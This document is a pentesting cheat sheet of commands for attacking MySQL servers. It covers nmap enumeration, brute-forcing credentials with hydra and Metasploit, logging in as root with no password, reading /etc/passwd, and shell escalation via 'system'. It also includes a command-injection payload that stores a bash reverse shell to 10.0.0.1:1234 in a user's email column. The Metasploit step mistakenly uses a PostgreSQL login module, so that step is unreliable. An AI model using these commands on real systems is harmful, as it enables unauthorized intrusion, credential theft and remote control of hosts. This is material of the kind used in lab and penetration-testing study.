# Commands
### Enumeration
```bash
nmap --script mysql-info -p 3306 <target-ip>
nmap --script mysql-enum -p 3306 <target-ip>
nmap --script mysql-brute -p 3306 <target-ip>
nmap --script mysql-databases -p 3306 <target-ip>
nmap --script mysql-users -p 3306 <target-ip>
nmap --script mysql-* -p 3306 <target-ip>
```
### Brute Force Credentials
```bash
hydra -l username -P passwords.txt <target-ip> mysql
hydra -L usernames.txt -p password <target-ip> mysql

# Metasploit
msfconsole
msf> use auxiliary/scanner/postgres/postgres_login
msf> set rhosts <target-ip>
msf> run
```

## Config File
```bash
cat /etc/mysql/my.cnf
cat /etc/mysql/mysql.conf.d/mysqld.cnf
```

### Connect

#### Local
```bash
# No password
mysql -u username

# With Password
mysql -u username -p

# Specity database name
mysql -u username -p database_name

# Execute commands
mysql -u username -p database_name -e "show databases;"
echo '<password>' | mysql -u username -p database_name -e "show databases;"

# Execute commands via a file
echo 'show tables;' > example.sql
mysql -u username --password='password' database_name -v < example.sql

# Read arbitrary files
mysql -u username --password='password' database_name -v < /etc/passwd

```

#### Remote
```bash
mysql -u username -p -h <target-ip> -P 3306

# Without password (remove -p)
mysql -u username -h <target-ip> -P 3306

# Specify database (-D)
mysql -u username -p -h <target-ip> -D database_name

# Default credential (username: root, no password)
mysql -u root -h <target-ip> -P 3306
```
### Execute from File
After connecting MySQL, you can execute SQL commands from a .sql file.
Note that we need to change the current directory to the directory in which the .sql file is located.

```bash
mysql> source example.sql
```

### Basic Commands

```bash
# List mysql users
mysql> select user from mysql.user;
# List privileges of each user
mysql> select user,select_priv,insert_priv,update_priv,delete_priv,create_priv from mysql.user;

# Display databases
mysql> show databases;

# Switch to the database
mysql> use db_name;

# Display tables in the current database
mysql> show tables;
# Display tables and table type
mysql> show full tables;
# Display tables in the database
mysql> show tables from <database>;
# Display tables which names start with 'user'
mysql> show tables like 'user%';
# Display tables which names start with 'user' in the database
mysql> show tables from <database> like 'user%';
```

### Command Injection
We can inject the OS command to column values e.g. email address.
Depending on the situation, we may be able to execute arbitrary command.
```bash
# Update existing user email to execute reverse shell
mysql> update exampledb.users SET email='admin@shell|| bash -c "bash -i >& /dev/tcp/10.0.0.1/1234 0>&1" &' where name like 'admin%';
```

### System Commands
We can run the system command in MySQL shell as below. Depending on the situation, we may be able to escalate privileges.
```bash
mysql> system whoami
mysql> system bash
```
